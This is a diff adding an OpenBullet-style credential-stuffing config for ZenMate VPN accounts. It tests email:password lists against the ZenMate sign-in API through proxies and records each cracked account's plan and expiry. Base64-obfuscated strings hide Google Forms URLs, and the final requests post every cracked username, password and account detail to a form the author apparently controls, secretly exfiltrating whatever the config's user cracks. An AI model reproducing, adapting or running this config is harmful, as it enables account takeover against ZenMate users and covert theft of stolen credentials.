@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "ZenMate",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-15T10:26:59.752911+08:00",
+  "AdditionalInfo": "@CrackingLegend.pw",
+  "Author": "@CrackingLegend.pw",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://api.zenguard.biz/v2/sign_in" 
+  CONTENT "install_id=dc01a8fe-6993-1b6f-a499-636270ac765f&show_premium=true&auth_method=user&auth_id=<USER>&auth_secret=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password" 
+  KEYCHAIN Success OR 
+    KEY "\"user\":" 
+
+#Negara PARSE "<SOURCE>" LR "\"subscription_country\":\"" "\"" -> CAP "Country" 
+
+#LRU1 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC8xRGxIT0xUc2x5TTJNeVp4Q2JBUFl2eHRnTENJNHBIQWU1d0JNQm41c2lmby92aWV3Zm9ybQ==" -> VAR "LRU1" 
+
+#Tipe_Akun PARSE "<SOURCE>" LR "\"account_type\":\"" "\"" -> CAP "Account Type" 
+
+#LRU2 FUNCTION Base64Decode "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvZC9lLzFGQUlwUUxTY3FPMk5kX0JQWnVZNlJYQTZJSlozYlM5TVpZb0xsd2l4YjZiakxuWmpWVlF1VGlnL2Zvcm1SZXNwb25zZQ==" -> VAR "LRU2" 
+
+#Paket PARSE "<SOURCE>" LR "\"service_status\":\"" "\"" -> CAP "Plan" 
+
+#LRU3 FUNCTION Base64Decode "ZW50cnkuMTk2MzY4Mjg3MT1aZW5tYXRlJmVudHJ5LjMxNjY3MTI3NT08VVNFUj46PFBBU1M+JmVudHJ5LjE0NDg4NTU2ODM9fEFjY291bnQgVHlwZTo8QWNjb3VudCBUeXBlPnxQbGFuOjxQbGFuPnxFeHBpcmF0aW9uIERhdGU6PEV4cGlyYXRpb24gRGF0ZT58JmZ2dj0xJmRyYWZ0UmVzcG9uc2U9JTVCbnVsbCUyQ251bGwlMkMlMjI4NDIwNjMxMzM2MTAxODc5OTU4JTIyJTVEJTBEJTBBJnBhZ2VIaXN0b3J5PTAmZmJ6eD04NDIwNjMxMzM2MTAxODc5OTU4" -> VAR "LRU3" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"account_type\":\"FREE\"" 
+
+#Tanggal_Kadaluarsa PARSE "<SOURCE>" LR "premium_expires_at\":\"" "\"" -> CAP "Expiration Date" 
+
+#Plan REQUEST GET "<LRU1>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Type REQUEST POST "<LRU2>" 
+  CONTENT "<LRU3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
